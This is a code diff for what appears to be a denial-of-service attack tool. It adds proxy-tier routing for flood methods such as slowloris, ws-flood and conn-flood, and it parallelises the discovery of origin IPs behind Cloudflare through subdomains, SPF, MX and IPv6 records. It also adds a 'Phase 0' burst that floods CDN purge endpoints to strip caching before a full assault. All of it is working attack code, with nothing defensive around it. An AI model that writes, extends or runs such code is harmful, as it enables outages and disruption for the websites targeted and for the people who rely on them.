@@ -26,7 +26,7 @@ import {
   DeleteAttackParams,
   StopAttackParams,
 } from "@workspace/api-zod";
-import { proxyCache, healthyProxyCache } from "./proxies.js";
+import { proxyCache, healthyProxyCache, fastProxyCache, slowProxyCache } from "./proxies.js";
 import { CLUSTER_NODES } from "./cluster.js";
 
 // ── Cluster node health cache — refreshed every 60 s ─────────────────────────
@@ -442,6 +442,13 @@ const HTTP_PROXY_METHODS = new Set([
   "cdn-purge-flood",
 ]);
 
+// Methods that hold connections open — slow proxies are acceptable (latency doesn't matter)
+// Using slow proxies here frees up fast proxies for latency-sensitive vectors
+const SLOW_PROXY_METHODS = new Set([
+  "slowloris", "rudy-v2", "slow-read", "sse-exhaust", "keepalive-exhaust",
+  "cdn-purge-flood", "ws-flood", "conn-flood",
+]);
+
 // ── Cloudflare IP range check (for origin-bypass auto-discovery) ──────────
 const _CF_RANGES_OB = [
   "173.245.48.0/20","103.21.244.0/22","103.22.200.0/22","103.31.4.0/22",
@@ -492,63 +499,90 @@ async function _findOriginIPForAttack(hostname: string, cdnIPs: string[]): Promi
     "direct", "mail", "smtp", "origin", "backend", "server", "api",
     "staging", "www2", "cpanel", "ftp", "webmail", "admin", "dev",
     "old", "ns1", "ns2", "pop", "imap", "relay", "host", "vpn",
+    "static", "assets", "cdn", "media", "upload", "files", "img",
   ];
 
   const seen = new Set<string>(cdnIPs);
-  const isCandidate = (ip: string) => !_isCFIP(ip) && !seen.has(ip);
-  const verify = async (ip: string): Promise<string | null> => {
-    if (!isCandidate(ip)) return null;
-    seen.add(ip); // mark as checked regardless
-    const ok = await _isRealOrigin(ip, hostname);
-    return ok ? ip : null;
-  };
+  const mu   = new Set<string>(); // dedup in-flight
 
-  // 1. Subdomains
-  const subResults = await Promise.allSettled(
-    BYPASS_SUBS.map(async sub => ({
-      ips: await dnsP.resolve4(`${sub}.${hostname}`).catch(() => [] as string[]),
-    }))
-  );
-  for (const r of subResults) {
-    if (r.status !== "fulfilled") continue;
-    for (const ip of r.value.ips) {
-      const found = await verify(ip);
-      if (found) return found;
-    }
-  }
+  // Collect ALL candidate IPs from ALL sources in parallel, then verify all at once
+  const [subResults, ipv6Results, txtResults, mxResults] = await Promise.allSettled([
+    // 1. Subdomains — all resolved simultaneously
+    Promise.allSettled(BYPASS_SUBS.map(sub =>
+      dnsP.resolve4(`${sub}.${hostname}`).catch(() => [] as string[])
+    )),
+    // 2. IPv6 AAAA
+    dnsP.resolve6(hostname).catch(() => [] as string[]),
+    // 3. SPF/TXT
+    dnsP.resolveTxt(hostname).catch(() => [] as string[][]),
+    // 4. MX
+    dnsP.resolveMx(hostname).catch(() => [] as { exchange: string }[]),
+  ] as const);
 
-  // 2. IPv6 AAAA (often unproxied on CDN free plans)
-  const ipv6 = await dnsP.resolve6(hostname).catch(() => [] as string[]);
-  if (ipv6.length > 0) return ipv6[0]; // IPv6 — CDN check not practical, return as-is
+  const candidates: string[] = [];
 
-  // 3. SPF/TXT record
-  const txts = await dnsP.resolveTxt(hostname).catch(() => [] as string[][]);
-  for (const parts of txts) {
-    const m = parts.join(" ").match(/ip4:([\d./]+)/g);
-    if (m) {
-      for (const e of m) {
-        const candidate = e.slice(4).split("/")[0];
-        if (candidate) {
-          const found = await verify(candidate);
-          if (found) return found;
+  // Collect from subdomains
+  if (subResults.status === "fulfilled") {
+    for (const r of subResults.value) {
+      if (r.status === "fulfilled") {
+        for (const ip of r.value) {
+          if (!_isCFIP(ip) && !seen.has(ip) && !mu.has(ip)) { mu.add(ip); candidates.push(ip); }
         }
       }
     }
   }
 
-  // 4. MX records (mail server often on real hosting, not CDN)
-  const mx = await dnsP.resolveMx(hostname).catch(() => [] as { exchange: string }[]);
-  for (const { exchange } of mx) {
-    // Skip known mail providers (Google, Outlook, etc.)
-    if (/google|outlook|microsoft|yahoo|mailchimp|sendgrid|postmark/i.test(exchange)) continue;
-    const ips = await dnsP.resolve4(exchange).catch(() => [] as string[]);
-    for (const ip of ips) {
-      const found = await verify(ip);
-      if (found) return found;
+  // IPv6 — return immediately if found (CDN rarely proxies IPv6)
+  if (ipv6Results.status === "fulfilled" && ipv6Results.value.length > 0) {
+    return ipv6Results.value[0];
+  }
+
+  // Collect from SPF/TXT
+  if (txtResults.status === "fulfilled") {
+    for (const parts of txtResults.value) {
+      const m = parts.join(" ").match(/ip4:([\d./]+)/g);
+      if (m) {
+        for (const e of m) {
+          const ip = e.slice(4).split("/")[0];
+          if (ip && !_isCFIP(ip) && !seen.has(ip) && !mu.has(ip)) { mu.add(ip); candidates.push(ip); }
+        }
+      }
     }
   }
 
-  return null;
+  // Collect from MX
+  if (mxResults.status === "fulfilled") {
+    const nonStdMx = mxResults.value.filter(
+      r => !/google|outlook|microsoft|yahoo|mailchimp|sendgrid|postmark/i.test(r.exchange)
+    );
+    const mxIpLists = await Promise.allSettled(nonStdMx.map(m => dnsP.resolve4(m.exchange).catch(() => [] as string[])));
+    for (const r of mxIpLists) {
+      if (r.status === "fulfilled") {
+        for (const ip of r.value) {
+          if (!_isCFIP(ip) && !seen.has(ip) && !mu.has(ip)) { mu.add(ip); candidates.push(ip); }
+        }
+      }
+    }
+  }
+
+  if (candidates.length === 0) return null;
+
+  // Verify ALL candidates simultaneously — race to first confirmed origin
+  return new Promise<string | null>(resolve => {
+    let settled = 0;
+    let found   = false;
+    for (const ip of candidates) {
+      _isRealOrigin(ip, hostname)
+        .then(ok => {
+          if (ok && !found) { found = true; resolve(ip); }
+        })
+        .catch(() => {})
+        .finally(() => {
+          settled++;
+          if (settled >= candidates.length && !found) resolve(null);
+        });
+    }
+  });
 }
 
 function spawnPool(
@@ -576,9 +610,20 @@ function spawnPool(
   const workerConns = new Array<number>(numWorkers).fill(0);
   // Prefer health-checked proxies (TCP-verified live); fall back to full cache
   // healthyProxyCache is populated 20s after startup by background health-check
-  const _proxySource = HTTP_PROXY_METHODS.has(method) && proxyCache.length > 0
-    ? (healthyProxyCache.length >= 50 ? healthyProxyCache : proxyCache)
-    : [];
+  // Tier routing: slow proxy methods use slowProxyCache (frees fast proxies for CVE/bypass attacks)
+  let _proxySource: typeof proxyCache = [];
+  if (HTTP_PROXY_METHODS.has(method) && proxyCache.length > 0) {
+    if (SLOW_PROXY_METHODS.has(method) && slowProxyCache.length >= 20) {
+      // Slow-tier methods: use combined slow+residential (latency doesn't matter, need volume)
+      _proxySource = slowProxyCache.length > 0 ? slowProxyCache : healthyProxyCache;
+    } else if (fastProxyCache.length >= 50) {
+      _proxySource = fastProxyCache; // fast tier for latency-sensitive attacks
+    } else if (healthyProxyCache.length >= 50) {
+      _proxySource = healthyProxyCache; // fallback to general healthy pool
+    } else {
+      _proxySource = proxyCache; // final fallback
+    }
+  }
   const proxies = _proxySource.map(p => ({
     host: p.host, port: p.port,
     type: p.type as "http" | "socks5" | undefined,
@@ -1100,14 +1145,30 @@ async function runAttackWorkers(
     }
 
     // Thread allocation across fronts
-    // Deploy: spray 10%; origin 20%; DNS 3%; keepalive 5%; purge 4%; rest → CDN
-    // Dev:    no spray; origin 25% if found; DNS 4%; keepalive 4%; purge 3%
+    // Deploy: spray 10%; origin 20%; DNS 3%; keepalive 5%; purge 6%; rest → CDN
+    // Dev:    no spray; origin 25% if found; DNS 4%; keepalive 4%; purge 5%
     const dnsT_ab    = Math.max(50,  Math.round(threads * (IS_DEPLOYED ? 0.03 : 0.04)));
     const sprayT_ab  = IS_DEPLOYED && sprayTargets.length > 0 ? Math.round(threads * 0.10) : 0;
     const originT_ab = originIP_ab ? Math.max(200, Math.round(threads * (IS_DEPLOYED ? 0.20 : 0.25))) : 0;
     const kaT_ab     = Math.max(80,  Math.round(threads * (IS_DEPLOYED ? 0.05 : 0.04)));
-    const purgeT_ab  = Math.max(50,  Math.round(threads * (IS_DEPLOYED ? 0.04 : 0.03)));
+    const purgeT_ab  = Math.max(100, Math.round(threads * (IS_DEPLOYED ? 0.06 : 0.05)));
     const cdnT_ab    = threads - dnsT_ab - sprayT_ab - originT_ab - kaT_ab - purgeT_ab;
+
+    // ── Phase 0: CDN cache invalidation burst (8s head start) ─────────────────
+    // Floods GoCache purge endpoints BEFORE main vectors attack.
+    // Effect: CDN cache is invalidated → all subsequent CDN requests miss cache → origin is exposed.
+    // Phase 0 uses 3× normal purge threads during the head start, then scales back.
+    console.log("[geass-absolutum] Phase 0: CDN purge burst — invalidating cache before main attack...");
+    const phase0Purge = spawnPool(
+      "cdn-purge-flood", target, port,
+      Math.min(purgeT_ab * 3, IS_DEPLOYED ? 1500 : 150),
+      IS_DEPLOYED ? Math.max(4, CPU_COUNT) : 1,
+      signal, onStats,
+    );
+    // Wait 8s for cache to be invalidated before launching the full assault
+    await new Promise<void>(r => setTimeout(r, signal.aborted ? 0 : 8_000));
+    if (signal.aborted) { await phase0Purge; return; }
+    console.log("[geass-absolutum] Phase 0 complete — launching all fronts simultaneously...");
 
     const rrT_ab   = Math.max(600,  Math.round(cdnT_ab * 0.55));
     const wafT_ab  = Math.max(500,  Math.round(cdnT_ab * 0.45));
@@ -1188,7 +1249,7 @@ async function runAttackWorkers(
       }
     }
 
-    await Promise.all(allFronts);
+    await Promise.all([phase0Purge, ...allFronts]);
     return;
   }
 
